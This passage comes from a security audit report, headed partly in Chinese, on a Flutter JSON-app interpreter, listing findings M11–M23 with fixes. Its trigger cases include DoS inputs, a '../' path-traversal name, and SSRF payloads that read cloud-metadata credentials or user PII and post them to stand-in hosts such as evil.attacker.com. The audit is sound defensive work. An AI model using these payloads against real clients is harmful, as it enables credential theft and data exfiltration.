**机制**：JsonBackdropBlurWidget and JsonImageFilterWidget read sigmaX/sigmaY straight from JSON via _resolveDouble with no upper clamp, then construct ImageFilter.blur(sigmaX, sigmaY). A very large sigma (e.g. 1e7) forces the rasterizer to sample an enormous kernel over the backdrop, causing extreme GPU/CPU load or driver stalls/crash on every frame the filter is composited. _resolveDouble can also yield NaN/Inf (double.tryParse of 'Infinity'/'NaN' or arithmetic from {{ }}), and a NaN/Inf sigma is undefined behaviour for the blur filter.

**触发用例**：

```
{"type":"backdrop_blur","sigmaX":100000000,"sigmaY":100000000,"child":{"type":"text","value":"x"}}
```

**影响**：Untrusted JSON can freeze or crash the GPU/UI thread of the precompiled client.

**修复建议**：Clamp sigmaX/sigmaY to a sane finite range (e.g. 0..100) and reject NaN/Inf before constructing ImageFilter.blur.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and reachable. Both widget types are registered in /home/fish/ai-app/lib/json_ui/widget_builder.dart (lines 141-142: 'backdrop_blur' and 'image_filter'), so untrusted JSON can instantiate them. In /home/fish/ai-app/lib/json_ui/widgets/visual_primitives_widget.dart, JsonBackdropBlurWidget (lines 22-28) and JsonImageFilterWidget (lines 49-52) read sigmaX/sigmaY via _resolveDouble and pass them straight into ImageFilter.blur(sigmaX, sigmaY) with no upper clamp. _resolveDouble (lines 2973-2979) only does `value.toDouble()` for numeric JSON and `double.tryParse(...)` for strings — no max bound, and no NaN/Inf rejection (Dart's double.tryParse('Infinity')/('NaN') succeed; arithme。…

</details>

---

#### `M11` — Grid overlay in _ImageShaderPathPainter scales line count with path bounds (per-frame quadratic DoS)

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/widgets/visual_primitives_widget.dart:568-592`

**机制**：When drawGrid is true the painter computes step = max(0.25, gridStep) and loops `for (x = step; x < bounds.width; x += step)` and similarly for y, drawing a clipped line each iteration. gridStep is attacker-controlled with a floor of only 0.25, while bounds come from the JSON path whose coordinates are unbounded (clip points use raw x/y or width*factor, no clamp). With gridStep=0.25 and a path of width/height = 100000 (e.g. point x=100000), this draws ~400000 vertical + ~400000 horizontal clipped lines every repaint (shouldRepaint returns true), each under canvas.clipPath. This runs every frame, hanging the UI thread.

**触发用例**：

```
{"type":"image_shader_path","mode":"polygon","drawGrid":true,"gridStep":0.25,"points":[{"x":0,"y":0},{"x":100000,"y":0},{"x":100000,"y":100000}]} — valid as written (>=3 points satisfies the polygon path builder); produces path bounds 100000x100000, step 0.25 → ~400k vertical + ~400k horizontal clipped drawLine calls in one paint. Note: hang occurs on initial paint and on every subsequent rebuild (e.g. any interpreter notifyListeners), not literally every vsync frame, since the painter has no animation driver.
```

**影响**：Untrusted JSON freezes the client by forcing hundreds of thousands of clipped draw calls per frame.

**修复建议**：Cap the number of grid lines (e.g. compute lineCount = bounds.width/step and skip/clamp when it exceeds a few thousand), and clamp incoming path coordinates / bounds to the widget size.

<details><summary>对抗验证者核验结论</summary>

Verified the mechanism end-to-end in /home/fish/ai-app/lib/json_ui/widgets/visual_primitives_widget.dart.

REACHABILITY: The widget is registered as type 'image_shader_path' in widget_builder.dart:158 (JsonImageShaderPathWidget), so untrusted JSON can instantiate it directly.

ATTACKER CONTROL: In JsonImageShaderPathWidget.build (lines 273-276, 319-320), `points`, `drawGrid`, and `gridStep` are read straight from JSON args via _clipPoint / _resolveDouble with no clamping. `_ClipPoint.resolve` (lines 616-619) uses the raw `x ?? ...` coordinate — a point with x:100000 yields an unbounded path. There is no clamp anywhere to the widget size.

PAINTER LOOP: In _ImageShaderPathPainter.paint (lines。…

</details>

---

#### `M12` — CacheManager writes cache file using unvalidated package name in relPath — path traversal on cache write

**类别**：宿主访问 · **边界**：D · **置信度**：high  
**位置**：`lib/json_ui/cache_manager.dart:230-235`

**机制**：After download, relPath = '${apps|packages}/$name/$resolvedVersionStr.json' (line 231) is written via NativeFs.writeStringAbs('$_cacheDir/$relPath', ...) which auto-creates parent dirs. `name` originates from untrusted JSON (@launch_app market name, or a dependency key) and is never sanitized for '/' or '..'. resolvedVersionStr comes from the (untrusted) Registry response. A name like '../../evil' or one containing slashes escapes _cacheDir.

**触发用例**：

```
@launch_app({kind:"market",name:"../../../../tmp/pwn"}) where the Registry resolves it (or a malicious/MITM Registry returns version='../x'); writeStringAbs writes app JSON to '$_cacheDir/apps/../../../../tmp/pwn/<version>.json', creating directories outside the cache dir.
```

**影响**：Arbitrary-path file write outside the cache directory driven by untrusted package name / Registry-controlled version string.

**修复建议**：Validate name and version against a strict charset (lowercase letters, digits, -, _, single namespace slashes) before using them in any filesystem path; reject '..' and leading/trailing separators; percent-escape or hash the name for the on-disk path.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and reachable. At /home/fish/ai-app/lib/json_ui/cache_manager.dart:230-235, relPath = '${type=="app"?"apps":"packages"}/$name/$resolvedVersionStr.json' is built with no sanitization of `name` or `resolvedVersionStr`, then written via NativeFs.writeStringAbs('$_cacheDir/$relPath', ...). NativeFs.writeStringAbs (native_fs_io.dart:67-76) does f.parent.createSync(recursive:true) then writeAsString with NO path normalization or containment check, so '..' segments escape _cacheDir.

Untrusted-input trace to sink is verified:
- launcher_bridges.dart:227 reads name = args['name'] from @launch_app(kind:"market") JSON args, :237 passes it unsanitized to CacheManager.getResource(type:。…

</details>

---

#### `M13` — @parallel shares mutable loop/params/variable state across concurrent branches → context corruption & write races

**类别**：竞态 · **边界**：E · **置信度**：medium · **原始/校准严重度**：high → medium  
**位置**：`lib/json_ui/interpreter.dart:2951-2961 (_builtinParallel)`

**机制**：_builtinParallel starts every child step concurrently with `Future.wait` while they all share the single instance-level `_loopContextStack`, `_paramsStack`, `_eventContextStack`, and `_variables`. As soon as two branches contain (or call functions containing) @for_each / @loop_by_num / a @global.fn, their push/removeLast operations interleave on the SAME List: branch A pushes its loop frame, await yields, branch B pushes its frame, then `_loopContextStack.last` (used by getVariable for `loop.item`) returns B's frame inside A's body, and removeLast pops the wrong frame → the stack desynchronizes for the rest of the run. Concurrent setVariable calls also race on nested maps and fire notifyListeners storms.

**触发用例**：

```
{ "call": "@parallel", "args": { "steps": [ { "call": "@for_each", "args": { "source": [1,2,3], "body": [ { "call": "@http_get", "args": { "url": "https://slow/a" } }, { "call": "@set", "args": { "var": "global.r", "value": "{{ loop.item }}" } } ] } }, { "call": "@for_each", "args": { "source": ["a","b"], "body": [ { "call": "@http_get", "args": { "url": "https://slow/b" } }, { "call": "@set", "args": { "var": "global.r2", "value": "{{ loop.item }}" } } ] } } ] } } — the awaited @http_get forces a yield after each branch pushes its loop frame, so by the time branch A's @set runs, _loopContextStack.last is branch B's frame and global.r is written branch B's item. Confirmed against interpreter.dart:2951-2961 (_builtinParallel), 2885-2904 (_builtinForEach push/await/removeLast), 1270 (synchronous _resolveArgs), 761-764 (getVariable reads _loopContextStack.last).
```

**影响**：Non-deterministic state corruption and stack imbalance whenever @parallel branches use loop/params context or write shared variables; can also leave _loopContextStack permanently desynced (see related imbalance finding). Effectively the documented @parallel concurrency primitive is unsafe with the very builtins it is meant to parallelize.

**修复建议**：Give each parallel branch its own isolated context (snapshot/clone the loop/params/event stacks per branch and merge variable writes deterministically), or serialize branches that touch loop/params context. At minimum, document that @parallel branches must not use loop/params context and guard against it.

<details><summary>对抗验证者核验结论</summary>

The mechanism is real and triggerable. _builtinParallel (interpreter.dart:2951-2961) starts every child step concurrently via Future.wait over a list of futures, with NO per-branch context isolation — they all share the single instance-level _loopContextStack/_paramsStack/_eventContextStack and _variables. I verified there is no lock/mutex/queue/serialization anywhere in the interpreter (grep for Lock/mutex/synchronized/Completer/queue returned nothing).\n\nTracing the trigger concretely: _builtinParallel calls _executeStep(forEachA) which runs synchronously into _builtinForEach (2885-2904), pushes A's frame {item:1,index:0} onto _loopContextStack (2893), then hits `await _executeStep(@http_。…

</details>

---

#### `M14` — @parallel runs concurrent steps over shared loop/params/event context stacks → cross-task state corruption

**类别**：竞态 · **边界**：E · **置信度**：high · **原始/校准严重度**：high → medium  
**位置**：`lib/json_ui/interpreter.dart:2951-2961 (with stacks declared 44-50, mutated in _builtinForEach 2892-2902, _executeFunctionDef 3660-3670)`

**机制**：_builtinParallel launches every child step concurrently via Future.wait without awaiting them in sequence. All steps share the single instance-level _loopContextStack / _paramsStack / _eventContextStack. Any step that internally pushes/pops these stacks (a @for_each, @loop_by_num, a @global.fn call which pushes _paramsStack, or an SSE/event callback) does push-await-pop. Because the awaits interleave, step A can pop a frame that step B pushed, or read loop.item/params.x belonging to the other branch. The stacks are plain Lists with no per-task isolation, so concurrent push/removeLast corrupts indices and can also throw 'RangeError removeLast on empty'.

**触发用例**：

```
steps: [{"call":"@parallel","args":{"steps":[{"call":"@for_each","args":{"source":[{"url":"https://a/1"},{"url":"https://a/2"}],"body":[{"call":"@http_get","args":{"url":"{{ loop.item.url }}"},"assign":"global.x"}]}},{"call":"@for_each","args":{"source":[{"url":"https://b/1"},{"url":"https://b/2"}],"body":[{"call":"@http_get","args":{"url":"{{ loop.item.url }}"},"assign":"global.y"}]}}]}}] — the two @for_each loops interleave their push/removeLast on the shared _loopContextStack at the inner @http_get await boundaries; from iteration 2 onward loop.item resolves to the wrong branch's item and the stack can underflow, throwing RangeError on removeLast (interpreter.dart:2901). Note: both branches' URLs are author-controlled, so this is intra-app state corruption + intermittent crash, not cross-privilege exfiltration.
```

**影响**：Non-deterministic wrong values written to variables, requests sent to the wrong URLs (data exfil to wrong host), and intermittent RangeError crashes routed through onActionCrash. Violates the documented '@parallel: 并发执行多个 step' contract which implies independent execution.

**修复建议**：Either run @parallel children with their own cloned context stacks (snapshot loop/params/event before launching each future and restore around each await), or document/forbid context-stack-pushing builtins inside @parallel and detect+reject them. Simplest correct approach: give each parallel branch its own short-lived interpreter-context object instead of the shared instance stacks.

<details><summary>对抗验证者核验结论</summary>

The mechanism is real and reachable. Verified in /home/fish/ai-app/lib/json_ui/interpreter.dart:

1. The three context stacks (_loopContextStack, _paramsStack, _eventContextStack) are plain shared instance-level Lists (lines 44-50). Variable resolution reads the live top via `.last` (lines 763-772, 779; namespace map lines 435-437), NOT a captured snapshot.

2. _builtinForEach (2892-2902), _builtinLoopByNum (2910-2919), _executeFunctionDef (3660-3670), and the event paths (1130-1134, 3122-3130) all do push-await-pop on these shared stacks, awaiting nested steps in between.

3. _builtinParallel (2951-2961) launches all child step futures concurrently and `await Future.wait`s them, with no per。…

</details>

---

#### `M15` — @launch_app race: child config loaded and executeSteps awaited, then navigator/popState wired up — state mutated relative to a route that may never push

**类别**：竞态 · **边界**：E · **置信度**：medium  
**位置**：`lib/json_ui/builtins/launcher_bridges.dart:311-342`

**机制**：_launchApp calls pushState() (311) then loadConfig(config) + await executeSteps() (313-314) BEFORE checking the navigator (321). The child app's startup steps run against the shared interpreter while the parent's route is still on top and no child route exists yet. If executeSteps triggers navigation/notifyListeners, the parent's still-mounted JsonScreenView rebuilds reading child state (the comment at interpreter.dart:156-157 explicitly warns parent reads child residue). Furthermore, popState is bound to route.whenComplete (337-340); if executeSteps schedules timers/lifecycle hooks (the lifecycle listener is re-attached in loadConfig:611 against the child config) those fire under child state even after the route is later popped and popState restores the parent — the lifecycle listener itself is never snapshotted/restored, so after popState the listener still points at whichever _config is current, and an in-flight async hook can run steps against the wrong app.

**触发用例**：

```
Untrusted parent JSON-App's button action runs @launch_app targeting a child app whose startup steps are: [ {"@http_get": {"url":"https://slow-host/x","bind":"global.r"}}, {"@set":{"global.x": "loaded"}} ]. In launcher_bridges.dart _launchApp: pushState() (311) then loadConfig(child) (313) and await executeSteps() (314) run BEFORE navigator.push (328). During that await, the parent JsonScreenView (a ConsumerWidget that ref.watch(interpreterProvider) and reads interpreter.currentScreenId / interpreter.screens live — main.dart:2853-2872, holding no per-app snapshot) is still the topmost mounted route. The child's @set calls setVariable → notifyListeners() (interpreter.dart:834/838) while _config/_currentScreenId are the child's. The parent route rebuilds against child state: it loops the child's screens for the child's currentScreenId, so it either renders the child's UI inside the parent's route or falls to the 'pageConfigNotFound' branch (main.dart:2874) — a visible glitch for the full duration of the slow startup. A second, narrower variant: child declares global.lifecycle.onResume with an awaiting step; the user backgrounds/foregrounds the app while an onResume hook (_runStepList, interpreter.dart:3882) is mid-await and popState() runs in the same window — the in-flight hook then resumes executing @set against the restored parent _variables. There is no epoch/appId guard to abort continuations after popState.
```

**影响**：Async state races across the app boundary: parent renders child data, or child/parent lifecycle hooks execute against the wrong _config, leading to corrupted UI and cross-app side effects.

**修复建议**：Push the child route first (or render a transient loading route), then loadConfig+executeSteps so the parent screen is detached before child state is installed; snapshot/restore the lifecycle listener binding in pushState/popState; guard async continuations with an epoch/appId check that aborts if popState has since run.

<details><summary>对抗验证者核验结论</summary>

The central race is real and reaches impact from untrusted JSON. I confirmed: (1) _launchApp pushes state and runs loadConfig + await executeSteps before the child route exists (launcher_bridges.dart:311-340); (2) the parent JsonScreenView reads interpreter state live with no snapshot (main.dart:2853-2872) and rebuilds on notifyListeners; (3) @set/setVariable fires notifyListeners synchronously during executeSteps (interpreter.dart:826-840); (4) no epoch/appId/mounted guard aborts in-flight executeSteps or lifecycle _runStepList continuations after popState. So during the launch await the parent route reliably rebuilds against child _config/_currentScreenId (visible UI glitch / pageConfigNot。…

</details>

---

#### `M16` — @audio.play fetches arbitrary attacker-controlled http(s) audio URLs (SSRF/exfil from inside game sandbox)

**类别**：SSRF/数据外泄 · **边界**：C · **置信度**：medium  
**位置**：`lib/games/game_audio.dart:185-194`

**机制**：_sourceFor returns UrlSource(source) for any http/https URL, and play() accepts an arbitrary idOrSource not present in the catalog (line 34). So a JSON App can cause GET requests to any host (including internal/loopback) by playing an audio 'source'. The URL is also a side channel: request timing/existence and the chosen path can encode/exfiltrate small amounts of state derived from game vars via template interpolation in the id/source.

**触发用例**：

```
Inside a flame_game JSON App, run an action: {"call": "@audio.play", "args": {"source": "http://127.0.0.1:9000/internal"}} or {"source": "http://169.254.169.254/latest/meta-data/"}. Because the source is absent from the audio catalog, game_audio.dart:34 builds _AudioSpec(source: idOrSource) and _sourceFor (line 187-188) returns UrlSource(source), issuing an outbound GET to the host. For exfil: {"source": "http://attacker.example/leak/{{ vars.score }}"} — game_logic.dart:107 template-resolves the arg, encoding game state into the request path.
```

**影响**：SSRF to internal/loopback/metadata hosts and low-bandwidth exfiltration channel reachable purely from in-game logic.

**修复建议**：Restrict @audio.play to ids defined in the configured audio catalog (reject raw arbitrary sources), or apply the same egress allowlist/host policy used for other HTTP capabilities.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and fully reachable from untrusted JSON. Trace: a game action `{"call":"@audio.play","args":{"source":"http://169.254.169.254/..."}}` reaches GameActions.dispatch (game_actions.dart:611-620), where `args['id'] ?? args['source']` is forwarded to GameAudioController.play() (game_audio.dart:26). The string is NOT in `_catalog`, so line 34 builds `_AudioSpec(source: idOrSource)` from the raw attacker value. _playOneShot/_playLooping then call `_sourceFor(source)` (line 185-194), which returns `UrlSource(source)` for ANY http/https scheme — audioplayers' UrlSource performs a real network fetch of that URL. There is no allowlist, no loopback/metadata/internal-host check anywhere 。…

</details>

---

#### `M17` — No host allowlist in _resolveUrl enables SSRF to loopback/internal hosts

**类别**：SSRF/数据外泄 · **边界**：C · **置信度**：medium · **原始/校准严重度**：high → medium  
**位置**：`lib/json_ui/http_client.dart:26-35`

**机制**：_resolveUrl (http_client.dart:26-35) accepts any URL that parses with a scheme (line 30 returns it verbatim) and otherwise resolves relative paths against AppConfig.backendUrl. There is no allowlist and no block on loopback (127.0.0.1, localhost), link-local (169.254.169.254 cloud metadata), or RFC1918 internal addresses. All @http_* builtins (interpreter.dart:2965-3116) pass attacker-controlled urls straight through. On platforms where the client runs alongside internal services (web origin proxies, desktop with local daemons, or server-side rendering of DSL), untrusted JSON can probe/reach internal endpoints and read responses back into variables.

**触发用例**：

```
[{"action":"@http_get","args":{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","bind":"global.r"}},{"action":"@http_post","args":{"url":"https://evil.attacker.com/x","body":{"d":"{{ global.r }}"}}}]
```

**影响**：Server-side request forgery: reach internal/loopback/metadata services and exfiltrate their responses; also network-position scanning via @http_head/@http_options status codes.

**修复建议**：In _resolveUrl, validate the resolved host against an allowlist (or at minimum block loopback, link-local, and private IP ranges and non-http(s) schemes) before issuing any request.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and fully traced from untrusted input to sink. `_resolveUrl` (lib/json_ui/http_client.dart:26-35) returns any URL with a scheme verbatim (line 30) and otherwise resolves relative against AppConfig.backendUrl — no allowlist, no loopback/link-local/RFC1918 block, no scheme restriction. The Dio instance (constructor lines 16-24) installs no validating interceptor; a project-wide grep found no interceptors, allowlist, or redirect policy (Dio thus follows redirects by default, maxRedirects=5). All @http_* builtins pass args['url'] straight through: dispatch at interpreter.dart:1571-1574 (@http_get/@http_post) → _builtinHttpGet/_builtinHttpPost (2965/2974) → DslHttpClient.get/pos。…

</details>

---

#### `M18` — @get_user_info returns the full user record (PII) to untrusted JSON with no gating

**类别**：SSRF/数据外泄 · **边界**：C · **置信度**：high · **原始/校准严重度**：high → medium  
**位置**：`lib/json_ui/interpreter.dart:2429-2439`

**机制**：@get_user_info (interpreter.dart:2429-2439) returns _normalizeUserInfo of AuthService.currentUser with no permission gating. _normalizeUserInfo (3907-3916) only reconciles avatar_url/face_url and returns the entire user map unchanged, so any field present on the Supabase user object (email, username, id, metadata) is handed to untrusted JSON. Combined with the unrestricted @http_* exfil sink (see token finding), an app can ship the victim's PII to any external host.

**触发用例**：

```
[{"action":"@get_user_info","args":{"bind":"global.me"}},{"action":"@http_post","args":{"url":"https://evil.attacker.com/pii","body":{"u":"{{ global.me }}"}}}]
```

**影响**：Silent PII disclosure (email/username/user id) of every user who runs the malicious JSON App, enabling phishing/correlation. Lower than the token finding because it is data leakage rather than direct session takeover.

**修复建议**：Return only a minimal, app-safe projection of the user (e.g. display name + avatar) by default; gate full-record / email access behind an explicit per-app permission. Apply the same external-host allowlist on @http_* sinks.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and matches the cited lines. interpreter.dart:2429-2439 (@get_user_info) calls _normalizeUserInfo(Map.from(AuthService.currentUser!)) and returns it, binding it to whatever variable the JSON names. _normalizeUserInfo (interpreter.dart:3907-3916) only reconciles avatar_url/face_url and returns the full user map unchanged — no field filtering, no permission gate. AuthService.currentUser (auth/auth_service.dart:61-76) returns a copy of _user, which is populated from the backend login response's `user` object (auth_service.dart:292/369/468 `_user = data['user']`), so email/username/id/metadata are all present. There is no per-app permission or allowlist around @get_user_info.\n。…

</details>

---

#### `M19` — Rive src URL fetched with no host allowlist enables SSRF and unbounded download

**类别**：SSRF/数据外泄 · **边界**：C · **置信度**：high · **原始/校准严重度**：high → medium  
**位置**：`lib/json_ui/widgets/rive_animation_widget.dart:156-157`

**机制**：_createLoader() takes the fully attacker-controlled src (json['src']/'url'/'asset', resolved through templates at line 14-16) and, when it starts with http:// or https://, calls rive.FileLoader.fromUrl(widget.src, ...) with zero validation. There is no host allowlist, no scheme restriction beyond http/https, no block on loopback/link-local/internal hosts, and no download size cap. interpreter.dart has no global SSRF guard either (grep for localhost/127.0.0.1/169.254/InternetAddress/maxContentLength returns nothing). The fetch is driven entirely from untrusted JSON, so a malicious JSON-App can cause the client to issue arbitrary GET requests on app load (initState->_load) to any host reachable from the victim device.

**触发用例**：

```
{ "type": "rive_animation", "src": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" } or src pointed at an internal corp host (http://10.0.0.5/admin) or an attacker host that returns a multi-GB body to exhaust memory/bandwidth. The widget builds it via JsonWidgetBuilder and _RiveAnimationView.initState immediately fires _load().
```

**影响**：SSRF: an untrusted JSON-App probes/reaches internal networks, cloud metadata endpoints (169.254.169.254), and loopback services from the victim's network position, breaking the precompiled client capability boundary. Unbounded download: a hostile URL streaming a huge file exhausts memory/handles (DoS). The request also leaks the victim's IP/network presence to an arbitrary attacker host.

**修复建议**：Before constructing FileLoader.fromUrl, validate the URL: parse with Uri.tryParse, require https (or an explicit allowlisted scheme), reject hosts resolving to loopback/private/link-local ranges, and enforce a host allowlist consistent with the rest of the platform. Cap the response size (download via a length-limited HTTP client and hand the bytes to FileLoader.fromBytes) and reject content beyond a sane Rive file budget. Apply the same guard used for HTTP builtins; if none exists platform-wide, introduce one and reuse it here, image_widget.dart, and video_widget.dart.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and correctly cited. In /home/fish/ai-app/lib/json_ui/widgets/rive_animation_widget.dart, build() reads json['src']/'url']/'asset'] and template-resolves it (lines 14-16); the value flows untouched into _RiveAnimationView.src and _createLoader() at lines 156-157 calls rive.FileLoader.fromUrl(widget.src, ...) whenever src starts with http(s):// — with no scheme/host validation, no loopback/link-local/private-range block, and no download size cap. The widget is registered ('rive_animation' -> JsonRiveAnimationWidget) at widget_builder.dart:139 and is built from untrusted JSON, so initState->_load() fires the GET on app load. The only pre-existing guard is _isWidgetTest (line 。…

</details>

---

#### `M20` — SSRF / loopback access via untrusted tileset & tile image URLs

**类别**：SSRF/数据外泄 · **边界**：C · **置信度**：medium  
**位置**：`lib/games/tiled_map_entity.dart:682-689, 749-757`

**机制**：Tileset `source` and image `source`/`image` come directly from untrusted map JSON/TMX. _loadTileset() (line 682 `_resolve(tsxSource)`, line 687-688 `_resolve(imageSource); _loadBytes(imageUrl)`) and _loadTilesetFromJson() (line 749-754) resolve these strings and call assetManager.loadBytes(). For http/https URLs that flows into AssetCache._getBytes (asset_cache.dart line 71-73) which performs an http.Client GET with no host allowlist, no block of internal/loopback/link-local addresses, and (by default) redirect following. An attacker-authored map can therefore make the client issue GET requests to arbitrary hosts, including http://127.0.0.1:.../ or cloud metadata endpoints.

**触发用例**：

```
JSON App invokes a game action with set_map_data passing map_data containing an inline tileset whose image points at an internal/loopback URL, e.g. action args {"map_data":{"width":1,"height":1,"tilewidth":16,"tileheight":16,"tilesets":[{"firstgid":1,"image":"http://169.254.169.254/latest/meta-data/","tilewidth":16,"tileheight":16,"tilecount":1,"columns":1,"tiles":[]}],"layers":[]}}. On load() -> _loadFromJson -> _loadTilesetFromJson (tiled_map_entity.dart:754) the client issues an unfiltered GET to the metadata endpoint via AssetCache._getBytes line 100. The same works for the loopback case (image":"http://127.0.0.1:8080/") and via the TMX path using a tileset/image source attribute. The set_map_data wiring is at game_actions.dart:689-694.
```

**影响**：Client-side SSRF: probe/access internal services reachable from the device, fetch attacker-controlled URLs (request smuggling / reachability oracle). On platforms where the app has network privilege to internal networks this can reach otherwise-protected endpoints.

**修复建议**：Validate resolved URLs before loadBytes: reject loopback, private (RFC1918), link-local (169.254/fc00::/fe80::) and non-http(s) schemes for untrusted Tiled assets; optionally restrict to an allowlisted asset host/CDN. Disable redirect following or re-validate redirect targets.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and reachable from untrusted input. Tileset/image sources in Tiled map JSON/TMX are attacker-controlled: in _loadTilesetFromJson (tiled_map_entity.dart:744-754) the `image`/`imageSource`/`image_source` field is read straight from the map JSON, resolved via _resolve, and passed to _loadBytes(imageUrl); the TMX path _loadTileset (682-688) does the same for tsx `source` and the nested image `source`. _loadBytes -> JsonAppAssetManager.loadBytes (asset_manager.dart:49-56) routes any http/https URL to AssetCache.getBytes, which in _getBytes (asset_cache.dart:66-110) does `_http.get(uri)` at line 100 with NO host allowlist, NO loopback/RFC1918/link-local block, scheme restricted o。…

</details>

---

#### `M21` — Loop/params context stack imbalance when a body step throws (no try/finally in for_each / loop_by_num / function exec)

**类别**：状态破坏 · **边界**：E · **置信度**：high · **原始/校准严重度**：high → medium  
**位置**：`lib/json_ui/interpreter.dart:2885-2904 (_builtinForEach), 2906-2922 (_builtinLoopByNum), 2660-2671 (_executeFunctionDef:3660-3670)`

**机制**：These three pump child steps then call `_loopContextStack.removeLast()` / `_paramsStack.removeLast()` AFTER the loop body, with no try/finally. If any body step throws (e.g. a malformed builtin, a thrown @throw, a type error from malformed data), the exception propagates out before removeLast runs, so the pushed loop/params frame is NEVER popped. The leaked frame then shadows `{{ loop.item }}` / `{{ params.x }}` for all subsequent, unrelated execution in the app, and on the next exception the imbalance compounds. Note the event-scope path (_runStepListWithEvent:3118, executeActionWithEvent:1125) correctly uses try/finally — the inconsistency confirms this is an oversight.

**触发用例**：

```
Within a single app session (e.g. a startup step or button action): { "call": "@try_catch", "args": { "try": [ { "call": "@for_each", "args": { "source": [1,2,3], "body": [ { "call": "@throw", "args": { "message": "x" } } ] } } ], "catch": [] } }. The @throw on the first iteration propagates out of _builtinForEach before removeLast() (line 2901), leaking a {'item':1,'index':0} frame onto _loopContextStack. @try_catch swallows the error. Afterwards, any unrelated text using "{{ loop.item }}" or "{{ loop.index }}" outside a loop resolves to 1 / 0 (the leaked frame) instead of being left as literal/null. Same with @loop_by_num, with a thrown error inside a function body (leaking _paramsStack and shadowing {{ params.x }}), or a throw during buildWidgetInLoopContext.
```

**影响**：Cross-context state corruption: a stale loop/params scope pollutes later widget builds and actions (wrong/ghost data rendered), and repeated triggers grow the stacks unboundedly. Hard-to-debug data leakage between unrelated parts of the same app.

**修复建议**：Wrap each push in try/finally so removeLast always runs: `_loopContextStack.add(...); try { ... } finally { _loopContextStack.removeLast(); }`. Same for _paramsStack in _executeFunctionDef and buildWidgetInLoopContext.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and reachable from untrusted JSON. Verified all four cited code paths in /home/fish/ai-app/lib/json_ui/interpreter.dart:

- _builtinForEach (line 2885-2904): pushes _loopContextStack.add({'item',...}) at 2893, runs body via _executeStep at 2897, then removeLast() at 2901 — NO try/finally.
- _builtinLoopByNum (line 2906-2922): same pattern, removeLast() at 2919 unguarded.
- _executeFunctionDef (line 3649-3672): _paramsStack.add at 3660, removeLast at 3670 unguarded.
- buildWidgetInLoopContext (line 3720-3730): _loopContextStack.add at 3726, removeLast at 3728 unguarded.

Dispatch confirmed: _executeStep routes '@for_each'→2885, '@try_catch'→2924, '@throw'→1419 (which throws 。…

</details>

---

#### `M22` — pushState/popState does not snapshot flame resetters & input handlers — child resetters leak into parent, parent @flame_game_reset hits unmounted child

**类别**：状态破坏 · **边界**：E · **置信度**：high · **原始/校准严重度**：high → medium  
**位置**：`lib/json_ui/interpreter.dart:55-57, 624-660, 4030-4060`

**机制**：_flameGameResetters and _flameGameInputHandlers are interpreter-instance lists registered by flame_game widgets. pushState() (lines 624-660) snapshots config/vars/functions/controllers/IM/loop/params/event stacks but NOT these two lists, and it does NOT clear them either. loadConfig() (lines 563-612) also never clears them. So when a parent app with a live flame_game (resetter registered) calls @launch_app, the child app loads OVER the same lists. The child's @flame_game_reset / @flame_game_input (interpreter.dart:1433-1455) now iterates resetters/handlers that include the PARENT's still-registered closures, calling into widgets in a route the user can no longer see; and after the child pops (popState, 665-713) the parent's resetter list may now also hold the child's stale closures (child flame widget's dispose unregister may race with pop). _InterpreterStateSnapshot (4030-4060) has no field for either list, confirming they are never saved/restored.

**触发用例**：

```
Parent launcher app screen embeds {"type":"flame_game",...} (registers a resetter). A button action calls @launch_app({kind:"local",fileName:"child.json"}). child.json startup or a button calls {"call":"@flame_game_reset"}. The child's reset fires the PARENT's resetter closure, mutating the parent's (now-backgrounded) game; symmetrically the parent's @flame_game_reset can fire a stale child resetter after the child unmounts.
```

**影响**：Cross-app state corruption: one untrusted JSON app drives another app's game engine state / input pipeline. Closures captured against widgets that are off-screen or disposed run, causing visual corruption, wrong-app side effects, or exceptions on disposed FlameGame instances.

**修复建议**：Add flameGameResetters/flameGameInputHandlers fields to _InterpreterStateSnapshot; in pushState() snapshot copies of both lists then clear the live lists; in popState() restore them. Same treatment for _scrollControllers/_scrollTargetKeys which are also un-snapshotted and merely cleared on loadConfig but not on push.

<details><summary>对抗验证者核验结论</summary>

Mechanism verified against real code. _flameGameResetters/_flameGameInputHandlers are declared at interpreter.dart:55-57. pushState() (624-660) snapshots config/vars/functions/controllers/IM/loop/params/event but NOT these two lists, and does NOT clear them; loadConfig() (576-582) clears scroll controllers, text controllers, focus nodes, IM sub, etc. but never these two lists; _InterpreterStateSnapshot (4030-4059) has no field for either, confirming they are never saved/restored. The flame_game widget (flame_game_widget.dart:156-157) registers a resetter+input handler in initState against the shared widget.interpreter, and unregisters them in dispose (162-163). Crucially, @launch_app pushes 。…

</details>

---

#### `M23` — pushState resets _activeModalCount to 0 without saving; popState never restores it — parent dialogs leak and dismissAllModals breaks

**类别**：状态破坏 · **边界**：E · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:105-119, 659, 665-713`

**机制**：_activeModalCount tracks live modal routes; _showXxxDialog increments before await and decrements in finally (e.g. 3290/3314). pushState() (line 659) sets _activeModalCount = 0 but never stores the prior value in the snapshot, and popState() (665-713) never restores it (no field in _InterpreterStateSnapshot, 4030-4060). If a parent app launches a child from inside a dialog action while a parent dialog is open (count>=1), the count is zeroed. Two corruptions result: (a) when that parent dialog finally completes after the child returns, its finally does _activeModalCount-- making the count negative, so dismissAllModals() (110-119, guarded by `_activeModalCount<=0 return` and `while(_activeModalCount>0)`) will never clean up genuinely-leaked parent dialogs; (b) child dialogs opened during the child session inflate a count that then survives into the parent via no-restore, desyncing the parent's bookkeeping.

**触发用例**：

```
